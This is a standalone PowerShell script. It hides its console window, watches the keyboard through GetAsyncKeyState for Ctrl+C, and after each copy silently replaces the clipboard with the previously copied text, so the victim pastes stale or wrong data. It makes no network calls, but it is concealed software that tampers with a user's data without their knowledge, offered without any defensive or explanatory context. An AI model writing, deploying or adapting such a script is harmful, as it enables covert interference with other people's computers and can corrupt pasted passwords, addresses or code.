
$key  = [Byte][Char]'C' ## Letter
$key2 = '0x11' ## Ctrl
$Signature = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@
Add-Type -MemberDefinition $Signature -Name Keyboard -Namespace PsOneApi

Add-Type -Name Window -Namespace Console -MemberDefinition '

[DllImport("Kernel32.dll")]

public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]

public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'

function Hide-Console {

   $consolePtr = [Console.Window]::GetConsoleWindow()

 #0 hide

[Console.Window]::ShowWindow($consolePtr, 0)

}

Hide-Console

$lastValue = ' '

do
{   If( [bool]([PsOneApi.Keyboard]::GetAsyncKeyState($key) -eq -32767 -and 
        [PsOneApi.Keyboard]::GetAsyncKeyState($key2) -eq -32767))
        { 
            
			$randVar = Get-Random -Maximum 25
			$clip = Get-Clipboard
			if($clip -is [string]) {
				$temp = Get-Clipboard
				Set-Clipboard -Value $lastValue
				$lastValue = $temp
				
			}
			
        }
    
      Start-Sleep -Milliseconds 100

} while($true)